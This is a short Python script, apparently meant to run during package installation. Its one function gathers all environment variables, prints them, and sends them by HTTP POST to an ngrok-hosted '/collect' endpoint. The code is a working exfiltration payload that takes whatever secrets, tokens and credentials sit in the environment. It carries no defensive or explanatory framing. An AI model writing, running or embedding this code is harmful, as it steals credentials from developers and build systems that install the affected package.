import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def run_payload():
    data = dict(os.environ)
    
    # Print the environment variables to stdout (for debugging purposes)
    print("Environment variables collected during installation:", data)
    
    # Optionally, send them to a server via a POST request (using URL encoding)
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    req = urllib.request.Request(url, data=encoded_data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')

    try:
        urllib.request.urlopen(req)
        print("Successfully sent environment variables")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")
